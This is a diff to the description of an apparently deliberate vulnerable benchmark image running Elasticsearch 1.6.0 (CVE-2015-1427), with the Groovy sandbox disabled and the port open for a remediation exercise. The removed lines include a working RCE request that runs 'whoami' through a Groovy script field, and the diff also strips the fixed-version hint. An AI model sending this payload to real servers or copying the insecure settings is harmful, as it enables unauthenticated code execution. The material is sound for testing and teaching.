@@ -5,7 +5,7 @@
 
 ## CVE
 **CVE-2015-1427** — Unauthenticated remote code execution via a Groovy
-scripting-engine sandbox bypass in Elasticsearch 1.3.x–1.6.0 (fixed in 1.6.1).
+scripting-engine sandbox bypass in Elasticsearch 1.3.x–1.6.0.
 
 ## Description
 Elasticsearch 1.4 replaced MVEL with Groovy as the dynamic-scripting language and
@@ -15,17 +15,10 @@ expression that escapes into the underlying JVM and calls arbitrary classes like
 `java.lang.Runtime` or `java.lang.ProcessBuilder`, achieving remote code execution
 as the Elasticsearch service account.
 
-This image runs Elasticsearch **1.6.0** (the last release before 1.6.1 closed the
-bypass). We also explicitly disable the sandbox in `elasticsearch.yml`
+This image runs Elasticsearch **1.6.0**. We also explicitly disable the sandbox in `elasticsearch.yml`
 (`script.groovy.sandbox.enabled: false`) and keep `script.disable_dynamic: false`
 so that dynamic scripting is reachable. Binding to `0.0.0.0` means any caller that
 can reach port 9200/TCP can exploit the RCE without credentials.
-
-> **Why 1.6.0 and not 1.1.1?** The metasploitable3-windows upstream pins
-> Elasticsearch 1.1.1 (CVE-2014-3120). On Server Core ltsc2019 the 1.1.1 JVM hits
-> a native Lucene JNI crash at startup under every JRE we tested. ES 1.6.0 boots
-> cleanly, targets the same `/_search` RCE attack surface, and lets the benchmark
-> agent exercise exactly the same remediation skills.
 
 ## Affected Service
 - **Service:** Elasticsearch 1.6.0 (standalone JVM, `elasticsearch.bat`)
@@ -41,25 +34,6 @@ http.port: 9200
 script.disable_dynamic: false           # dynamic scripting ENABLED
 script.groovy.sandbox.enabled: false    # Groovy sandbox DISABLED
 ```
-
-## Proof
-```
-POST /_search?pretty HTTP/1.1
-Host: <target>:9200
-Content-Type: application/json
-
-{
-  "size": 1,
-  "query": { "match_all": {} },
-  "script_fields": {
-    "rce": {
-      "lang": "groovy",
-      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cmd /c whoami\").getInputStream().text"
-    }
-  }
-}
-```
-The response body contains the process stdout of `whoami`.
 
 ## Constraints
 - This host has no outbound network access and no newer Elasticsearch distribution is staged on it.
